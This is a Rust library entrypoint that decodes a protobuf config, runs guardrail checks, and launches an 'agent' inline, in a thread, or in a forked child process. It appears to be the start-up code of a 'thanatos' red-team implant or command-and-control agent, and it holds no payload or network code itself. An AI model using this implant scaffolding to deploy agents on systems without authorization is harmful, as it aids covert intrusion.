#![forbid(unsafe_code)]

use agent::Agent;
use prost::Message;
use thanatos_protos::config::{self, InitAction};

mod agent;
mod guardrails;
mod logging;
mod os;
mod system;

pub fn entrypoint(config: &[u8]) {
    let agent_config = match config::Config::decode(config) {
        Ok(c) => c,
        Err(e) => {
            debug!("Failed to decode config: {:?}", e);
            return;
        }
    };

    if !guardrails::run_checks(&agent_config) {
        return;
    }

    match agent_config.initaction() {
        InitAction::None => run_agent(agent_config),
        InitAction::Thread => {
            std::thread::spawn(|| run_agent(agent_config));
        }
        InitAction::Fork => {
            #[cfg(target_os = "linux")]
            {
                use ffiwrappers::linux::fork;
                match fork::fork() {
                    Ok(fork::ForkProcess::Child) => run_agent(agent_config),
                    Err(e) => {
                        debug!("Failed to fork process: {:?}", e);
                        return;
                    }
                    _ => (),
                }
            }

            #[cfg(target_os = "windows")]
            run_agent(agent_config);
        }
    };
}

fn run_agent(agent_config: config::Config) {
    let agent = match Agent::initialize(&agent_config) {
        Ok(a) => a,
        Err(e) => {
            debug!("Failed to initialize agent: {:?}", e);
            return;
        }
    };
}
